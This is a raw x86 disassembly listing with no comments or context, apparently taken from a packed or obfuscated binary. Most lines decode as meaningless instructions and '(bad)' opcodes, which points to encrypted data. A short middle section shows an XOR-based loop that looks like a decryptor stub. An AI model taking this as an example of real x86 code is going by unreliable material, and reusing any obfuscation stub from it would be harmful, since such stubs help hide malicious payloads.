  4116f2:	imul   edi,DWORD PTR [ebx+0x4cc74624],0x5f
  4116f9:	lods   al,BYTE PTR ds:[esi]
  4116fa:	int3   
  4116fb:	mov    DWORD PTR [ebx-0x4],esp
  4116fe:	neg    BYTE PTR [edx+0x19c97b23]
  411704:	mov    ebp,0x79590052
  411709:	push   ds
  41170a:	mov    esp,0xd37573e8
  41170f:	mov    eax,0x8227e531
  411714:	std    
  411715:	sub    BYTE PTR [edi+0x62],al
  411718:	fimul  WORD PTR cs:0xaecfcfca
  41171f:	mov    esi,0xfc17f51
  411724:	mov    ds:0x71dd5b5b,eax
  411729:	adc    dl,bh
  41172b:	sub    ah,dh
  41172d:	scas   al,BYTE PTR es:[edi]
  41172e:	(bad)
  411732:	adc    esi,eax
  411734:	push   esp
  411735:	inc    edi
  411736:	lods   al,BYTE PTR ds:[esi]
  411737:	les    edi,FWORD PTR [edi+ebx*8-0x5bd67160]
  41173e:	inc    ebp
  41173f:	cmc    
  411740:	stos   BYTE PTR es:[edi],al
  411741:	xor    DWORD PTR [ecx+ebx*4+0x24],ebp
  411745:	sti    
  411746:	and    BYTE PTR [ecx-0x102506a1],0x8
  41174d:	xor    BYTE PTR [edx-0x38fcadc3],0x5b
  411754:	mov    ah,0x2c
  411756:	ins    DWORD PTR es:[edi],dx
  411757:	dec    ebp
  411758:	arpl   sp,bp
  41175a:	es pop ebp
  41175c:	push   esi
  41175d:	call   0x67c4f86d
  411762:	iret   
  411763:	daa    
  411764:	std    
  411765:	cmp    al,0xa7
  411767:	imul   esp,DWORD PTR [edx],0xf49fb393
  41176d:	icebp  
  41176e:	and    eax,0x58170a12
  411773:	enter  0xb0ee,0xb9
  411777:	xor    esp,edx
  411779:	cmp    eax,DWORD PTR [edi+0x6e]
  41177c:	mov    ebx,0x1ab762de
  411781:	test   DWORD PTR [edx+0x4be8dad9],ebp
  411787:	outs   dx,BYTE PTR ds:[esi]
  411788:	inc    ecx
  411789:	sub    ch,cl
  41178b:	push   edx
  41178c:	add    eax,0x7347228f
  411791:	and    eax,0xb366cef5
  411796:	jne    0x411749
  411798:	mov    dl,0x7c
  41179a:	popf   
  41179b:	(bad)  
  41179c:	test   eax,0x1a780b1c
  4117a1:	jmp    edx
  4117a3:	fisub  WORD PTR [eax-0x39db10ca]
  4117a9:	pop    ebx
  4117aa:	test   eax,0xa36df237
  4117af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117b0:	faddp  st(2),st
  4117b2:	outs   dx,DWORD PTR ds:[esi]
  4117b4:	retf   0x2ff7
  4117b7:	call   0x530fc076
  4117bc:	ror    bl,0x64
  4117bf:	sub    bl,ah
  4117c1:	out    0x34,al
  4117c3:	jae    0x41178a
  4117c5:	sti    
  4117c6:	test   DWORD PTR [eax*1+0x35644398],eax
  4117cd:	inc    edi
  4117ce:	shr    DWORD PTR [edi],cl
  4117d0:	xchg   ebp,eax
  4117d1:	push   ebp
  4117d2:	sub    ch,BYTE PTR [ebx-0x3e]
  4117d5:	es test bl,dl
  4117d8:	inc    ebp
  4117d9:	iret   
  4117da:	stos   BYTE PTR es:[edi],al
  4117db:	lds    ecx,FWORD PTR ds:0x6ba549e6
  4117e1:	aam    0x74
  4117e3:	mov    al,ds:0xac44e507
  4117e8:	sbb    al,0x2e
  4117ea:	lods   eax,DWORD PTR gs:[esi]
  4117ec:	sub    dh,BYTE PTR [edx+0x25]
  4117ef:	mov    dl,0xb9
  4117f1:	pop    esp
  4117f2:	push   ecx
  4117f3:	xor    ah,BYTE PTR [edx]
  4117f5:	mov    edx,fs
  4117f7:	mov    ds,WORD PTR [ebx]
  4117f9:	(bad)  
  4117fa:	fnstsw WORD PTR [ebx+esi*2+0x42]
  4117fe:	lods   eax,DWORD PTR ds:[esi]
  4117ff:	(bad)  
  411800:	ja     0x41179b
  411802:	cmc    
  411803:	add    al,0xce
  411805:	dec    ecx
  411806:	push   ecx
  411807:	or     esi,DWORD PTR [ebx+0x4a]
  41180a:	out    dx,eax
  41180b:	imul   esp,DWORD PTR [edx-0x25e72780],0x5c
  411812:	and    ecx,DWORD PTR [esi+ecx*8]
  411815:	cmp    DWORD PTR [ebx-0x35890e8e],0xe
  41181c:	int    0x51
  41181e:	and    BYTE PTR [eax],0xa7
  411821:	jbe    0x41189d
  411823:	hlt    
  411824:	sahf   
  411825:	in     eax,dx
  411826:	pop    esi
  411827:	and    DWORD PTR [ecx+eiz*2+0x29e4a7bf],ecx
  41182e:	sar    ch,1
  411830:	and    al,0x38
  411832:	sub    bh,BYTE PTR [edx+eax*1+0x2ae231de]
  411839:	test   ebp,eax
  41183b:	aaa    
  41183c:	cmc    
  41183d:	in     al,dx
  41183e:	es mov bh,0xff
  411841:	into   
  411842:	stos   DWORD PTR es:[edi],eax
  411843:	jp     0x41187c
  411845:	mov    WORD PTR [ebp-0x6c7f2914],ds
  41184b:	mov    dh,0x93
  41184d:	lock jmp 0x4117d6
  411850:	mov    al,cl
  411852:	mov    WORD PTR [ebp+0x75393898],?
  411858:	(bad)  
  411859:	loope  0x41189b
  41185b:	loope  0x41180b
  41185d:	xchg   esi,esi
  41185f:	mov    al,BYTE PTR [eax]
  411861:	test   bl,bh
  411863:	popa   
  411864:	retf   0x1967
  411867:	dec    eax
  411868:	jg     0x41183b
  41186a:	mov    ebp,0x2657e096
  41186f:	push   ebx
  411870:	std    
  411871:	enter  0xb730,0xfb
  411875:	fnsave [eax-0x1e84a466]
  41187b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41187c:	mov    eax,DWORD PTR [ecx]
  41187e:	pop    esp
  41187f:	enter  0x633,0xdb
  411883:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411884:	and    al,0x5b
  411886:	cmp    al,0xf5
  411888:	jnp    0x41181c
  41188a:	(bad)  
  41188b:	in     eax,0x35
  41188d:	out    0xc,al
  41188f:	inc    esi
  411890:	xor    eax,0x5187c277
  411895:	popf   
  411896:	push   esi
  411897:	retf   
  411898:	clc    
  411899:	repnz retf 0xe95b
  41189d:	push   ds
  41189e:	pop    ebp
  41189f:	in     al,0xeb
  4118a1:	sub    eax,0x1e97dcc3
  4118a6:	adc    DWORD PTR [eax],ebp
  4118a8:	mov    edx,0x7bf7f17c
  4118ad:	cs jp  0x4118d0
  4118b0:	sbb    al,0xbd
  4118b2:	or     eax,0xd3db48f0
  4118b7:	mov    esi,0x1adc1950
  4118bc:	mov    WORD PTR [ebx+0x36],?
  4118bf:	sub    BYTE PTR [ecx+eiz*4-0x27],cl
  4118c3:	sar    dl,0xb3
  4118c6:	rcr    BYTE PTR [esi-0x80],1
  4118c9:	jno    0x411922
  4118cb:	repnz rcr DWORD PTR [si-0x66bd],cl
  4118d1:	out    dx,al
  4118d2:	dec    ecx
  4118d3:	imul   ecx,DWORD PTR [esp+eax*1+0xe],0x71
  4118d8:	stos   DWORD PTR es:[edi],eax
  4118d9:	push   edx
  4118da:	pushf  
  4118db:	enter  0x9fae,0xc5
  4118df:	pop    ss
  4118e0:	ud0    edx,DWORD PTR [edx-0x192f2d5f]
  4118e7:	pop    ss
  4118e8:	sub    ah,BYTE PTR [eax-0x5d4abc69]
  4118ee:	nop
  4118ef:	and    al,BYTE PTR [edx+0xb94cffc]
  4118f5:	or     eax,DWORD PTR [ecx-0xe]
  4118f8:	or     bh,dh
  4118fa:	and    ecx,edi
  4118fc:	lock sbb ebp,DWORD PTR [edx+0x3f]
  411900:	in     eax,dx
  411901:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411902:	dec    ecx
  411903:	jl     0x41196e
  411905:	sbb    eax,0xe3093c19
  41190a:	push   es
  41190b:	mov    bl,0xf7
  41190d:	cmp    dh,bh
  41190f:	fld    DWORD PTR ds:0x74c0a0be
  411915:	out    0x65,eax
  411917:	xlat   BYTE PTR ds:[ebx]
  411918:	xor    cl,BYTE PTR ds:0x26ae04d2
  41191e:	jno    0x4118b3
  411920:	imul   ebx,DWORD PTR [ecx+0x19],0xffffffc4
  411924:	xor    edi,DWORD PTR [ebp+0x10]
  411927:	and    DWORD PTR [eax-0x11e2355],edi
  41192d:	cmp    dl,BYTE PTR [esi-0xc]
  411930:	ret    
  411931:	scas   eax,DWORD PTR es:[edi]
  411932:	fist   DWORD PTR [esi+0x565b2139]
  411938:	mov    ebp,0xf4937951
  41193d:	or     al,0x30
  41193f:	cli    
  411940:	inc    ebx
  411941:	test   al,0x4d
  411943:	pop    ebx
  411944:	scas   al,BYTE PTR es:[edi]
  411945:	fst    QWORD PTR [ebx-0x7c84053f]
  41194b:	xor    eax,0xfa2a0e48
  411950:	mov    ah,0x7
  411952:	gs jg  0x41194c
  411955:	push   ebx
  411956:	fiadd  WORD PTR [ebx+edi*2+0x65]
  41195a:	dec    edi
  41195b:	or     edx,0x2e
  41195e:	ins    DWORD PTR es:[edi],dx
  41195f:	mov    esi,0xbd5568eb
  411964:	aaa    
  411965:	jbe    0x4119c3
  411967:	xor    al,0xe0
  411969:	push   edi
  41196a:	xchg   ecx,eax
  41196b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41196c:	xchg   edi,eax
  41196d:	data16 cli 
  41196f:	and    ecx,esp
  411971:	cs cmc 
  411973:	mov    edi,0xeb4730d2
  411978:	(bad)  
  411979:	in     eax,0xf
  41197b:	dec    ebx
  41197c:	out    0x32,eax
  41197e:	popa   
  41197f:	stos   DWORD PTR es:[edi],eax
  411980:	lds    ebp,FWORD PTR [edi-0x6cc3c336]
  411986:	sub    BYTE PTR [ecx+0x67],bh
  411989:	dec    esi
  41198a:	push   ss
  41198b:	mov    al,ds:0x4bc82464
  411990:	int3   
  411991:	sub    eax,0x935f3551
  411996:	sbb    BYTE PTR [eax-0x39],al
  411999:	repz cmp BYTE PTR ds:0x4978274e,ah
  4119a0:	shl    BYTE PTR [esi],cl
  4119a2:	and    dh,ah
  4119a4:	dec    eax
  4119a5:	int    0xfc
  4119a7:	clc    
  4119a8:	loopne 0x4119a1
  4119aa:	arpl   WORD PTR [ebx+ebx*8+0xd945a2d],bx
  4119b1:	sahf   
  4119b2:	add    edx,DWORD PTR [ebx]
  4119b4:	xchg   edx,eax
  4119b5:	or     al,0x26
  4119b7:	jae    0x41199e
  4119b9:	data16 cmc 
  4119bb:	inc    esi
  4119bc:	xchg   esi,eax
  4119bd:	or     ecx,edx
  4119bf:	inc    esi
  4119c0:	lock xchg ebp,eax
  4119c2:	pop    es
  4119c3:	ins    DWORD PTR es:[edi],dx
  4119c4:	leave  
  4119c5:	push   edx
  4119c6:	sub    eax,0xdd5d3ecd
  4119cb:	daa    
  4119cc:	and    al,0x95
  4119ce:	inc    eax
  4119cf:	addr16 dec edx
  4119d1:	add    eax,ecx
  4119d3:	cmp    al,0x46
  4119d5:	pop    edx
  4119d6:	push   ebp
  4119d7:	cmp    ch,cl
  4119d9:	dec    esi
  4119da:	shl    DWORD PTR [esi+0x47],1
  4119dd:	pop    eax
  4119de:	add    al,0xc
  4119e0:	mov    dl,0xe6
  4119e2:	je     0x4119a6
  4119e4:	lods   al,BYTE PTR ds:[esi]
  4119e5:	xchg   edx,eax
  4119e6:	pop    ecx
  4119e7:	sbb    DWORD PTR [eax+eax*2+0x61],esi
  4119eb:	sub    BYTE PTR [edi],ch
  4119ed:	jmp    0x411a2d
  4119ef:	enter  0x628c,0x97
  4119f3:	ret    0xf60
  4119f6:	ds aas 
  4119f8:	push   edi
  4119f9:	dec    ebp
  4119fa:	mov    bl,0xd0
  4119fc:	shl    DWORD PTR [ecx+0x78],0x2b
  411a00:	cmp    DWORD PTR [esi-0x25],esp
  411a03:	mov    ebp,0xc33a0ff9
  411a08:	or     al,0xdd
  411a0a:	(bad)  
  411a0b:	das    
  411a0c:	mov    edx,0x8dc9bd1d
  411a11:	test   ch,cl
  411a13:	out    0x36,eax
  411a15:	out    dx,eax
  411a16:	or     dh,dl
  411a18:	sar    ah,0x65
  411a1b:	ins    DWORD PTR es:[edi],dx
  411a1c:	mov    eax,0x9203bc1
  411a21:	sar    BYTE PTR [ebx+ecx*4-0x1f],1
  411a25:	sahf   
  411a26:	(bad)  
  411a27:	call   0x2205:0x9df447b4
  411a2e:	jb     0x411a93
  411a30:	stos   DWORD PTR es:[edi],eax
  411a31:	push   eax
  411a32:	xlat   BYTE PTR ds:[ebx]
  411a33:	jae    0x4119ff
  411a35:	pushf  
  411a36:	leave  
  411a37:	imul   edi,DWORD PTR [esi+0x31],0xffffffe9
  411a3b:	outs   dx,DWORD PTR ds:[esi]
  411a3c:	scas   eax,DWORD PTR es:[edi]
  411a3d:	daa    
  411a3e:	jns    0x411a5f
  411a40:	mov    ebp,0xa482edfd
  411a45:	pop    edx
  411a46:	inc    ebx
  411a47:	xchg   edi,eax
  411a48:	mov    BYTE PTR [edx-0x16653493],cl
  411a4e:	mov    dh,0x49
  411a50:	daa    
  411a51:	pop    ecx
  411a52:	outs   dx,BYTE PTR ds:[esi]
  411a53:	inc    edi
  411a54:	pop    ebx
  411a55:	xchg   cl,cl
  411a57:	mov    edx,0x505e1369
  411a5c:	arpl   WORD PTR [eax+0x393792fb],ax
  411a62:	sar    ah,1
  411a64:	loope  0x411a20
  411a66:	inc    esi
  411a67:	xor    BYTE PTR [edi+0x4f],ah
  411a6a:	xchg   ecx,eax
  411a6b:	loopne 0x411a7b
  411a6d:	(bad)  
  411a6e:	popf   
  411a6f:	cmp    ch,bl
  411a71:	and    al,0xe9
  411a73:	cld    
  411a74:	add    BYTE PTR [eax],ch
  411a76:	cld    
  411a77:	cmc    
  411a78:	xchg   edx,eax
  411a79:	jmp    0x372:0x1d2333c8
  411a80:	pusha  
  411a81:	mov    ch,BYTE PTR [edx]
  411a83:	xor    eax,0xb822f29a
  411a88:	mov    dh,BYTE PTR [eax+0x29f309d2]
  411a8e:	mov    cl,0xbd
  411a90:	fsubp  st(0),st
  411a92:	adc    DWORD PTR [edi-0xa],ebp
  411a95:	out    dx,eax
  411a96:	adc    DWORD PTR [ebp+edx*4+0x7b244e26],edi
  411a9d:	stc    
  411a9e:	fimul  DWORD PTR [ebx-0x14c5d680]
  411aa4:	inc    esp
  411aa5:	lock sbb esi,DWORD PTR [ecx+0x63]
  411aa9:	aas    
  411aaa:	mov    edx,DWORD PTR [ebp-0x18]
  411aad:	xor    edx,eax
  411aaf:	add    edx,esi
  411ab1:	cmp    ecx,edx
  411ab3:	mov    ecx,DWORD PTR [ebp-0x14]
  411ab6:	mov    DWORD PTR [ebp+0x8],ecx
  411ab9:	mov    ecx,DWORD PTR [ebp+0x8]
  411abc:	je     0x4164f7
  411ac2:	xor    ecx,eax
  411ac4:	add    ecx,esi
  411ac6:	mov    ecx,0x242ebe9
  411acb:	je     0x411bdb
  411ad1:	mov    edx,DWORD PTR [ebp+0x8]
  411ad4:	mov    ebx,DWORD PTR [ebp-0x8]
  411ad7:	xor    edx,eax
  411ad9:	xor    ebx,eax
  411adb:	sub    edx,ebx
  411add:	sub    edx,esi
  411adf:	xor    edx,eax
  411ae1:	mov    DWORD PTR [ebp+0x8],edx
  411ae4:	mov    edx,DWORD PTR [ebp+0x8]
  411ae7:	mov    ebx,DWORD PTR [ebp-0x58]
  411aea:	add    edx,0x5708c4
  411af0:	imul   edx,ebx
  411af3:	mov    DWORD PTR [ebp-0x58],edx
  411af6:	mov    edx,DWORD PTR [ebp+0x8]
  411af9:	mov    ebx,DWORD PTR [ebp-0x54]
  411afc:	add    edx,0x64f8da
  411b02:	or     edx,ebx
  411b04:	mov    DWORD PTR [ebp-0x54],edx
  411b07:	mov    edx,DWORD PTR [ebp+0x8]
  411b0a:	mov    ebx,DWORD PTR [ebp-0x50]
  411b0d:	add    edx,ecx
  411b0f:	xor    edx,ebx
  411b11:	mov    DWORD PTR [ebp-0x50],edx
  411b14:	mov    edx,DWORD PTR [ebp+0x8]
  411b17:	mov    ebx,DWORD PTR [ebp-0x4c]
  411b1a:	add    edx,edi
  411b1c:	and    edx,ebx
  411b1e:	mov    DWORD PTR [ebp-0x4c],edx
  411b21:	mov    edx,DWORD PTR [ebp+0x8]
  411b24:	mov    ebx,DWORD PTR [ebp-0x48]
  411b27:	lea    edx,[ebx+edx*1+0x241fc1f]
  411b2e:	mov    DWORD PTR [ebp-0x48],edx
  411b31:	mov    edx,DWORD PTR [ebp+0x8]
  411b34:	mov    ebx,0xfa5e15e2
  411b39:	sub    ebx,edx
  411b3b:	add    ebx,DWORD PTR [ebp-0x44]
  411b3e:	mov    DWORD PTR [ebp-0x44],ebx
  411b41:	mov    edx,DWORD PTR [ebp+0x8]
  411b44:	xor    edx,eax
  411b46:	add    edx,esi
  411b48:	jne    0x411ad1
  411b4e:	jmp    0x411bdb
  411b53:	mov    edx,DWORD PTR [ebp-0x14]
  411b56:	mov    DWORD PTR [ebp+0x8],edx
  411b59:	jmp    0x411bce
  411b5e:	mov    edx,DWORD PTR [ebp+0x8]
  411b61:	mov    ebx,DWORD PTR [ebp-0x8]
  411b64:	xor    edx,eax
  411b66:	xor    ebx,eax
  411b68:	sub    edx,ebx
  411b6a:	sub    edx,esi
  411b6c:	xor    edx,eax
  411b6e:	mov    DWORD PTR [ebp+0x8],edx
  411b71:	mov    edx,DWORD PTR [ebp+0x8]
  411b74:	mov    ebx,DWORD PTR [ebp-0x58]
  411b77:	add    edx,0x5708c4
  411b7d:	imul   edx,ebx
  411b80:	mov    DWORD PTR [ebp-0x58],edx
  411b83:	mov    edx,DWORD PTR [ebp+0x8]
  411b86:	mov    ebx,DWORD PTR [ebp-0x54]
  411b89:	add    edx,0x64f8da
  411b8f:	or     edx,ebx
  411b91:	mov    DWORD PTR [ebp-0x54],edx
  411b94:	mov    edx,DWORD PTR [ebp+0x8]
  411b97:	mov    ebx,DWORD PTR [ebp-0x50]
  411b9a:	add    edx,ecx
  411b9c:	xor    edx,ebx
  411b9e:	mov    DWORD PTR [ebp-0x50],edx
  411ba1:	mov    edx,DWORD PTR [ebp+0x8]
  411ba4:	mov    ebx,DWORD PTR [ebp-0x4c]
  411ba7:	add    edx,edi
  411ba9:	and    edx,ebx
  411bab:	mov    DWORD PTR [ebp-0x4c],edx
  411bae:	mov    edx,DWORD PTR [ebp+0x8]
  411bb1:	mov    ebx,DWORD PTR [ebp-0x48]
  411bb4:	lea    edx,[ebx+edx*1+0x241fc1f]
  411bbb:	mov    DWORD PTR [ebp-0x48],edx
  411bbe:	mov    edx,DWORD PTR [ebp+0x8]
  411bc1:	mov    ebx,0xfa5e15e2
  411bc6:	sub    ebx,edx
  411bc8:	add    ebx,DWORD PTR [ebp-0x44]
  411bcb:	mov    DWORD PTR [ebp-0x44],ebx
  411bce:	mov    edx,DWORD PTR [ebp+0x8]
  411bd1:	xor    edx,eax
  411bd3:	add    edx,esi
  411bd5:	jne    0x411b5e
  411bdb:	mov    edx,DWORD PTR [ebp-0x14]
  411bde:	mov    DWORD PTR [ebp+0x8],edx
  411be1:	jmp    0x4163be
  411be6:	jmp    0x413f9a
  411beb:	rcr    BYTE PTR [ecx-0x6f],1
  411bee:	and    BYTE PTR [ecx+0x70],dh
  411bf1:	ror    DWORD PTR [ecx+0x1e6f5998],1
  411bf7:	int3   
  411bf8:	int3   
  411bf9:	jo     0x411bf4
  411bfb:	dec    ebx
  411bfc:	test   eax,0x5feb7c7c
  411c01:	jl     0x411c7f
  411c03:	out    0x19,al
  411c05:	pop    eax
  411c06:	inc    ecx
  411c07:	xor    al,0xe2
  411c09:	(bad)  
  411c0a:	leave  
  411c0b:	aad    0x11
  411c0d:	pop    ss
  411c0e:	pop    es
  411c0f:	push   edi
  411c10:	retf   
  411c11:	inc    edi
  411c12:	stos   DWORD PTR es:[edi],eax
  411c13:	add    eax,0xee4634a
  411c18:	dec    edx
  411c19:	enter  0x3191,0x35
  411c1d:	(bad)  
  411c1e:	cmp    eax,0xba77ad65
  411c23:	jle    0x411c11
  411c25:	leave  
  411c26:	jb     0x411c1e
  411c28:	sar    DWORD PTR [ebp+0x58],0xd7
  411c2c:	jbe    0x3b4c2fd9
  411c32:	jb     0x411caa
  411c34:	mov    bl,0xdc
  411c36:	dec    ebp
  411c37:	int3   
  411c38:	test   eax,0xe49a5148
  411c3d:	cmc    
  411c3e:	jb     0x411c6f
  411c40:	dec    eax
  411c41:	dec    edx
  411c42:	imul   ebx,DWORD PTR [ecx+0x1e],0xffffffb3
  411c46:	fcom   QWORD PTR ds:0x7b0a5606
  411c4c:	dec    ecx
  411c4d:	repz push es
  411c4f:	popf   
  411c50:	cmc    
  411c51:	xchg   ecx,eax
  411c52:	jge    0x411c68
  411c54:	dec    edi
  411c55:	clc    
  411c56:	xor    al,0x6f
  411c58:	inc    esi
  411c59:	mov    al,ds:0x80e2d554
  411c5e:	jge    0x411c67
  411c60:	sub    eax,edx
  411c62:	test   edi,0xfd6d71a5
  411c68:	cmp    esp,edi
  411c6a:	xor    BYTE PTR [ebp-0x15],bh
  411c6d:	add    DWORD PTR [eax+0x7c38b6e4],ebp
  411c73:	push   cs
  411c74:	jae    0x411cc6
  411c76:	or     ebx,esp
  411c78:	pop    ecx
  411c79:	jbe    0x411c9d
  411c7b:	xchg   ebx,eax
  411c7c:	aad    0xb2
  411c7e:	pusha  
  411c7f:	cli    
  411c80:	xchg   al,ah
  411c82:	add    DWORD PTR [bp+si+0x17f4],edi
  411c87:	push   ss
  411c88:	jns    0x411ce1
  411c8a:	shl    DWORD PTR [ebx+edx*2-0x43],1
  411c8e:	imul   BYTE PTR [esi-0x37dd1b4d]
  411c94:	and    DWORD PTR [eax+ecx*2],esi
  411c97:	pop    ebx
  411c98:	outs   dx,DWORD PTR ds:[esi]
  411c99:	stos   DWORD PTR es:[edi],eax
  411c9a:	push   eax
  411c9b:	inc    ecx
  411c9c:	fld    TBYTE PTR [esi-0x175c2ced]
  411ca2:	gs in  eax,dx
  411ca4:	test   al,0x5e
  411ca6:	xchg   BYTE PTR [esi-0x57],dh
  411ca9:	fidivr WORD PTR [ebx+0x2b178ba5]
  411caf:	or     ecx,DWORD PTR [eax+0x7c]
  411cb2:	imul   eax,DWORD PTR [eax-0x7aa1ea13],0xffffff93
  411cb9:	je     0x411c87
  411cbb:	ret    
  411cbc:	add    DWORD PTR [ebp+0x2d],eax
  411cbf:	aam    0x3
  411cc1:	hlt    
  411cc2:	push   eax
  411cc3:	mov    edx,0xed627ece
  411cc8:	bound  edx,QWORD PTR [esi]
  411cca:	pushf  
  411ccb:	pop    es
  411ccc:	xchg   esp,eax
  411ccd:	fidivr DWORD PTR [ecx]
  411ccf:	jb     0x411c80
  411cd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411cd2:	pop    ss
  411cd3:	cmp    eax,0x8c8b5a09
  411cd8:	ret    0x7896
  411cdb:	mov    edi,0xad719bdb
  411ce0:	jge    0x411c66
  411ce2:	popf   
  411ce3:	mov    ds:0x70482993,eax
  411ce8:	fs loop 0x411c97
  411ceb:	jb     0x411d65
  411ced:	in     eax,0x26
  411cef:	ins    BYTE PTR es:[edi],dx
  411cf0:	sbb    ebp,esp
  411cf2:	mov    DWORD PTR [esi-0xceb9194],ebx
  411cf8:	addr16 mov eax,ds:0x4ff
  411cfc:	pop    ss
  411cfd:	add    eax,0x6226ac1
  411d02:	or     cl,BYTE PTR [eax-0x42]
  411d05:	retf   
  411d06:	das    
  411d07:	mov    dh,0x11
  411d09:	scas   al,BYTE PTR es:[edi]
  411d0a:	push   ds
  411d0b:	xchg   ecx,edx
  411d0d:	jnp    0x411cf9
  411d0f:	mov    ?,WORD PTR ds:0x53fe00de
  411d15:	inc    ecx
  411d16:	push   ss
  411d17:	repz and edi,DWORD PTR [ebx+0x7d0e8dfb]
  411d1e:	and    eax,0xc5bd318e
  411d23:	ret    0xd053
  411d26:	mov    dl,0x61
  411d28:	sahf   
  411d29:	retf   0x627c
  411d2c:	dec    eax
  411d2d:	enter  0x9e6,0x41
  411d31:	mov    WORD PTR [ebx-0x7f],gs
  411d34:	pusha  
  411d35:	dec    ebx
  411d36:	dec    ebp
  411d37:	jle    0x411d1a
  411d39:	xchg   edx,eax
  411d3a:	mov    eax,ds:0x6d163aa4
  411d3f:	xchg   ebx,eax
  411d40:	inc    eax
  411d41:	mov    bh,0x1b
  411d43:	add    al,0xfc
  411d45:	mov    DWORD PTR [edx+0x31],ebx
  411d48:	push   ebp
  411d49:	iret   
  411d4a:	or     esi,esp
  411d4c:	mov    ebp,0x6ec12ad6
  411d51:	rcr    BYTE PTR [ebx+ecx*8-0x37e41f8d],1
  411d58:	imul   edx,DWORD PTR [ebx],0x36
  411d5b:	mov    al,ds:0xec0a8633
  411d60:	mov    ebp,DWORD PTR [edx+ecx*2-0x5718f5d8]
  411d67:	jl     0x411d55
  411d69:	mov    eax,0xb1f45532
  411d6e:	jb     0x411dea
  411d70:	mov    bh,0x3b
  411d72:	mov    ch,0xf7
  411d74:	(bad)  
  411d75:	out    0x68,eax
  411d77:	xchg   ebx,eax
  411d78:	fst    QWORD PTR [edi-0x28808865]
  411d7e:	mov    bh,BYTE PTR [ecx-0x54189d15]
  411d84:	cli    
  411d85:	pop    ebp
  411d86:	jecxz  0x411db9
  411d88:	xchg   DWORD PTR [edi+0x24],eax
  411d8b:	or     BYTE PTR [edi+0x35dc2e1],0x4d
  411d92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d93:	inc    esp
  411d94:	mov    WORD PTR [edi-0x3987a0b1],ds
  411d9a:	push   0xaf040df3
  411d9f:	dec    ebp
  411da0:	enter  0xe086,0x36
  411da4:	xor    DWORD PTR [ebx],ecx
  411da6:	dec    eax
  411da7:	add    BYTE PTR [eax-0x16],al
  411daa:	les    ecx,FWORD PTR [edx+0x67256a0a]
  411db0:	shr    BYTE PTR [edx],0xab
  411db3:	(bad)  
  411db4:	mov    dl,0xa6
  411db6:	ret    0x17ed
  411db9:	inc    esp
  411dba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411dbb:	push   ebp
  411dbc:	mov    eax,ds:0xb4236751
  411dc1:	jno    0x411e0a
  411dc3:	ins    BYTE PTR es:[edi],dx
  411dc4:	jb     0x411d8d
  411dc6:	sub    esp,DWORD PTR [edi+0x33b2043c]
  411dcc:	popa   
  411dcd:	inc    edx
  411dce:	dec    ebp
  411dcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411dd0:	add    al,0xe1
  411dd2:	dec    ebx
  411dd3:	sbb    BYTE PTR [eax],bl
  411dd5:	(bad)  
  411dd6:	mov    bh,0xa2
  411dd8:	sbb    DWORD PTR [edi+0x56],eax
  411ddb:	xor    ecx,esi
  411ddd:	mov    cl,0x28
  411ddf:	dec    ebx
  411de0:	inc    esp
  411de1:	push   0x6ccd54f7
  411de6:	daa    
  411de7:	(bad)  
  411de8:	out    0x7b,al
  411dea:	jne    0x411d73
  411dec:	mov    ah,0xaf
  411dee:	sbb    eax,0x5e7ebc5b
  411df3:	add    DWORD PTR [eax-0x13],eax
  411df6:	jmp    0x6c5f8a35
  411dfb:	mov    ch,0xfb
  411dfd:	int3   
  411dfe:	dec    esi
  411dff:	mov    ?,WORD PTR [esi+0x2f9f3dd]
  411e05:	xchg   ebp,eax
  411e06:	das    
  411e07:	cmp    al,0xa
  411e09:	add    al,0xe3
  411e0b:	cmp    ch,dl
  411e0d:	jbe    0x411e51
  411e0f:	nop
  411e10:	test   eax,0x5b190577
  411e15:	(bad)  
  411e16:	js     0x411e55
  411e18:	inc    ebp
  411e19:	shl    BYTE PTR [ecx],cl
  411e1b:	jmp    0x411e61
  411e1d:	jmp    0x411e04
  411e1f:	aaa    
  411e20:	lock mov bh,BYTE PTR [eax+0x502c2cb5]
  411e27:	ins    DWORD PTR es:[edi],dx
  411e28:	pop    ebx
  411e29:	mov    ebp,0x69ee1857
  411e2e:	sub    eax,0xab845ea9
  411e33:	(bad)  
  411e34:	mov    bh,0x6
  411e36:	add    DWORD PTR [ecx-0x4ccfa81d],eax
  411e3c:	(bad)  
  411e3d:	mov    ds,ebp
  411e3f:	push   cs
  411e40:	sub    DWORD PTR [edi-0x3ec2c18c],ebp
  411e46:	or     al,0x8f
  411e48:	rcr    BYTE PTR [ebx+0x2c5f78d3],0xab
  411e4f:	sbb    esp,ecx
  411e51:	jb     0x411e4b
  411e53:	jle    0x411e42
  411e55:	stos   BYTE PTR es:[edi],al
  411e56:	rcl    edx,0x7d
  411e59:	mov    ecx,0x7bf22b63
  411e5e:	leave  
  411e5f:	or     DWORD PTR [esi],edx
  411e61:	lods   eax,DWORD PTR ds:[esi]
  411e62:	lea    ebx,[ebx+esi*2-0x22d83da9]
  411e69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e6a:	and    al,0x69
  411e6c:	xchg   ecx,eax
  411e6d:	shr    edx,0xbd
  411e70:	sub    eax,DWORD PTR [esp+edx*8]
  411e73:	mov    eax,0x2e3f8113
  411e78:	mov    eax,ds:0x474aa11a
  411e7d:	or     al,0x18
  411e7f:	repz xor bl,BYTE PTR [ecx+0x3c04264c]
  411e86:	jne    0x411ef3
  411e88:	push   ebp
  411e89:	push   ss
  411e8a:	cmp    eax,0x7a1cc4a
  411e8f:	jle    0x411f0f
  411e91:	add    BYTE PTR [esi+0x343e04d2],ch
  411e97:	dec    esp
  411e98:	mov    WORD PTR [edx-0x2a],gs
  411e9b:	mov    ds:0x4f615181,eax
  411ea0:	ja     0x411eba
  411ea2:	daa    
  411ea3:	sub    ebx,DWORD PTR [edx+0x67]
  411ea6:	div    BYTE PTR [edx]
  411ea8:	pop    edx
  411ea9:	mov    ebx,eax
  411eab:	push   0xc9015341
  411eb0:	xlat   BYTE PTR ds:[ebx]
  411eb1:	bound  ebp,QWORD PTR [edi-0x28]
